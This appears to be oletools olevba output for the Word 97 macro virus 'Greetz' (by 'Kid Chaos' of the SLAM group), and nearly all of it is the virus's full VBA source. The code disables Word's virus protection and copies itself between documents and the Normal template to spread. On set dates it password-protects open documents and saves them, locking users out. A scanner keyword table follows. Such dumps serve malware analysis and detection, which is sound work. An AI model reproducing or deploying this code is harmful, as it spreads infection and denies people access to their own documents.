olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Greetz-b8ebbd488d8716f6e63dd1bc7721606d9593986e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Greetz-b8ebbd488d8716f6e63dd1bc7721606d9593986e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO KidChaos.bas 
in file: Virus.MSWord.Greetz-b8ebbd488d8716f6e63dd1bc7721606d9593986e - OLE stream: 'Macros/VBA/KidChaos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub KC()
Dim Temp(3) As String
On Error GoTo Au
Temp(1) = "KidChaos"
Temp(2) = "SLAM"
Temp(3) = "Greetz"
With Application
    ScreenUpdating = False
    DisplayAlerts = wdAlertsNone
End With
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocInf = False
    GloInf = False
 For k = 1 To WordBasic.CountMacros(1)
 If WordBasic.MacroName$(k, 1) = "SLAM" Then DocInf = 1
 Next k
 If DocInf = False Then
     For z = 1 To 3
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
     Destination:=ActiveDocument.FullName, Name:=Temp(z), _
      Object:=wdOrganizerObjectProjectItems
      Next z
    ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
        End If
        For k = 1 To WordBasic.CountMacros(0)
 If WordBasic.MacroName$(k, 0) = "Greetz" Then GloInf = 1
 Next k
       If GloInf = False Then
       For z = 1 To 3
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:=Temp(z), _
          Object:=wdOrganizerObjectProjectItems
          Next z
        Options.SaveNormalPrompt = False
    End If
    Application.DisplayAlerts = wdAlertsAll
Au:

End Sub

Sub AutoExec()
'-----X-----S L A M    R O Q S !!! -----X-----
End Sub
-------------------------------------------------------------------------------
VBA MACRO SLAM.bas 
in file: Virus.MSWord.Greetz-b8ebbd488d8716f6e63dd1bc7721606d9593986e - OLE stream: 'Macros/VBA/SLAM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub AutoOpen()
' WM97.Greetz dedicated to my brotherz of SLAM VIRUS TEAM!
' (c) April 1998, by Kid Chaos [SLAM]
On Error GoTo seeya
If (Rnd() < 0.4) Then
With Assistant.NewBalloon
.BalloonType = msoBalloonTypeBullets
.Icon = msoIconTip
.Button = msoButtonSetOkCancel
.Heading = "Word97.Greetz" & vbCrLf & "by Kid Chaos [SLAM]"
.Labels(1).Text = " Greetings to SLAM friends:"
.Labels(2).Text = " Virtual Daemon" & vbCrLf & " Aurodreph" _
& vbCrLf & " CyberYoda" & vbCrLf & " Darx Kies" & vbCrLf & _
" Forms" & vbCrLf & " rAiD" & vbCrLf & " Shaitan" & vbCrLf & _
" Stealth Warrior" & vbCrLf & " Trigger" & vbCrLf & " Yesna"
.Show
End With
End If
seeya:
Call KC
End Sub

Sub HelpAbout()
On Error GoTo Ha
If (Day(Now()) > 13) Then
MsgBox "====> (c) 1998 by Kid Chaos <====" & vbCrLf & _
"====>  of SLAM Virus Team  <====" & vbCrLf & vbCrLf & _
"Hey Bill Gates, do you like other cake" & vbCrLf & _
"on your face? :-D" _
, vbCritical, "About WM97.Greetz... :-)"
End If
Ha:
End Sub

-------------------------------------------------------------------------------
VBA MACRO Greetz.bas 
in file: Virus.MSWord.Greetz-b8ebbd488d8716f6e63dd1bc7721606d9593986e - OLE stream: 'Macros/VBA/Greetz'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileTemplates()
On Error GoTo Ft
If (Day(Now()) = 13) Then
ActiveDocument.Password = "KidChaos"
Documents.Close SaveChanges:=wdSaveChanges
End If
Ft:
End Sub


Sub ToolsMacro()
On Error GoTo St
If (Day(Now()) = 1) Then
ActiveDocument.Password = "WeRoqs"
Documents.Close SaveChanges:=wdSaveChanges
End If
St:
End Sub


Sub ViewVBcode()
On Error GoTo Vv
If (Day(Now()) = 20) Then
ActiveDocument.Password = "SLAM98"
Documents.Close SaveChanges:=wdSaveChanges
End If
Vv:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Virtual             |May detect virtualization                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

